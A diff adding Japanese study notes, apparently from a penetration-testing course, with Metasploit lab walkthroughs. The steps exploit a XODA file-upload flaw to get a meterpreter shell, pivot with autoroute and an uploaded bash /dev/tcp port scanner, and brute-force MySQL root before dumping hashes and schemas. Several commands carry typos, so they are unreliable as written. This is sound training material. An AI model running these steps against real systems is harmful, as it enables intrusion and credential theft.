@@ -108,6 +108,27 @@ Nmapの結果をMSFにインポートする
 ・db_nmap -Pn -sV -O IPアドレス
 ・vulns
 
+demo nmapスキャン結果をMSFにインポートする
+1) ターミナルを起動する
+2) ターゲットマシンにアクセスする。
+ping -c 4 ターゲットIPアドレス
+＊対象マシンにアクセスできない場合は、-Pnオプションを使ってオンラインであると仮定して続ける
+3) 以下のコマンドでnmapスキャンの結果をmsfにインポートする。
+nmap -sV -Pn -oX myscan.xml targetIP
+4) msfにオンポートするためにpostgresqlデータベースサービスとmsfのコマンドラインを起動する。
+service pregresql start
+msfconsole
+5) 以下のコマンドで、msfdbに接続されていることを確認する
+db_status
+6) 以下のコマンドで、データベースにnmapのスキャンの結果をインポートする。
+db_import myscan.xml
+7) 以下のコマンドを実行すると結果を表示できる
+hosts（ターゲットIPが表記されれば正常）
+services（最初のスキャンと同じ結果であれば正常）
+
+
+
+
 列挙
 補助モジュールによるポートスキャン
 ・補助モジュールは、スキャン、検出、ファジングなどの機能を実行するために使用する。
@@ -119,11 +140,68 @@ Nmapの結果をMSFにインポートする
 ・run autoroute -s IPアドレス
 ・sessions
 
+demo ネットワークサービススキャン
+1) ターミナルを起動する
+2) ターゲットマシンにアクセスできるか確認
+ping -c 4 targetIP
+3) ターゲットのポートスキャンを行う
+nmap targetIP
+4) 以下のコマンドで、ターゲットマシンのポート80でホストされているHTTPコンテンツを確認する
+curl targetIP
+5) msfconsole
+6) 該当のモジュールを選択してパラメータの値を設定する。
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS targetIP
+set TARGETURI /
+set LOHOST myIP
+exploit
+→これにより、ターゲットマシンでmeterpreterセッションが生成される
+7) コマンドシェルを起動して、2番目のターゲットマシンのIPアドレスの範囲を特定する。
+shell
+ip addr
+8) metasploitのルーティングテーブルにルートを追加する
+run autoroute -s targetIP1
+9) 現在のmeterpreterセッションをバックグラウンドで実行し、metasploiのportscan tcpモジュールを使用して2番目のターゲットマシンをスキャンする。
+Ctrl+zを押すと、meterpreterをバックグラウンド実行に移す
+use auxiliary/scanner/portscan/tcp
+set RHOSTS targetIP
+set verbose false
+set port 1-1000
+exploit
+10) 「/usr/bin」ディレクトリで使用可能な静的バイナリを確認する
+ls -al /root/static-binaries/nmap
+file /root/static-binaries/nmap
+11) metasploitセッションをバッググラウンドで実行し、bashポートスキャンスクリプトを作成する。
+Ctrl+z
+以下のスクリプトを作成
+#!/bin/bash
+for port in {1..1000}; do
+ timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done
+名前は、bash-port-scanner.shとして保存
+12) metaploitセッションをフォアグラウンドにしてmeterpreterセッションに切り替える
+fg+enter
+13) nmap静的バイナリとbashポートスキャナースクリプトをターゲットマシンにアップロード
+upload /root/static-binaries/nmap /tmp/nmap
+upload /root/bash-port-scannner.sh /tmp/bash-port-scanner.sh
+14) バイナリとスクリプトを実行可能にし、bashスクリプトを使用して2番目のターゲットマシンをスキャンする。
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh IP
+15) nmapバイナリを使用してターゲットの開いているポートをスキャンする
+./nmap -p- IP
+
+
+
+
 FTP列挙
 ・FTPは、TCPポート21を使用するプロトコルで、サーバーとクライアント間でファイルの共有を行うために使用する
 ・FTPは、webサーバのディレクトリとの間でファイルを送受信する手段として頻繁に使用する
 ・複数の補助モジュールを使用して情報を列挙したり、ETPサーバーを実行しているターゲットに対してブルートフォース攻撃を実行できる。
 ・FTPの認証には、ユーザ名とパスコードの組み合わせだが、設定が不適切な場合は、匿名でログインできることもある。
+
+
 
 SMB列挙
 ・SMBは、ローカルネットワーク上のコンピュータ間でファイルや周辺機器の共有を容易にするために使用されるネットワークファイル共有プロトコル
@@ -147,6 +225,63 @@ MySQL　列挙
 
 ・verboseの設定
 
+demo MySQLの列挙
+1) ターミナルを起動する
+2) nmapでスキャンする
+nmap IPアドレス
+3) msfconsole -q
+4) バージョンの確認
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS IPアドレス
+run
+5) ブルートフォースによりクレデンシャルの特定
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS targetIP
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+＊クレデンシャル：システムやサービスを利用するための認証情報
+6) 情報を列挙する
+use auxiliary/admin/mysql_mysql_enum
+set USERNAME root
+set PASSWORD ブルーとでの判明したもの
+set RHOSTS targetIP
+run
+7) mysqlへのアクセス
+use auxiliary/admin/mysql/mysql_sql
+set USERNAME root
+set PASSWORD ブルートで判明した物
+set RHOSTS targetIP
+run
+8) mysqlに特定のファイルが存在するかを確認
+use auxiliary/scanner/mysql/mysql_file_enum
+set USERNAME root
+set PASSWORD ブルートフォースで発見したもの
+set RHOSTS targetIP
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE true
+run
+9) mysqlのユーザ情報を取得
+ use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD 同じ
+set RHOSTS targetIP
+run
+10) mysqlサーバに接続して、データベースの構造を引き出す
+use auxiliary/scanner/mysql/mysql_schemadump
+set USERNAME root
+set PASSWORD bruteによる
+set RHOSTS targetIP
+run
+11) mysqlサーバーからの書き込み可能なディレクトリを特定
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS targetIP
+set USERNAME root
+set PASSWORD bruteによる
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+
 SSH　列挙
 ・SSH(Secure Shell)は暗号化を提供するリモート管理用プロトコルで、Telnetの後継
 ・通常は、サーバーやシステムへのリモートアクセスに使用できる
@@ -159,4 +294,10 @@ SMTP　列挙
 ・SMTPは、デフォルトでTCPポート25を使用する。設定次第では、TCPポート465や587で動作する。
 ・補助モジュールにより。ターゲット上のSMTPのバージョンやユーザアカウントを列挙できる。
 
+demo Postfix：偵察
+1) ターミナルの起動する
+2) nmapスキャンによりバナーとサーバー名の特定
+nmap -sV -scriptt banner targetIP
+3) netcatを使用してsmtpサービスに接続し、サーバーのドメイン名を取得
+nc targetIP port_num
 
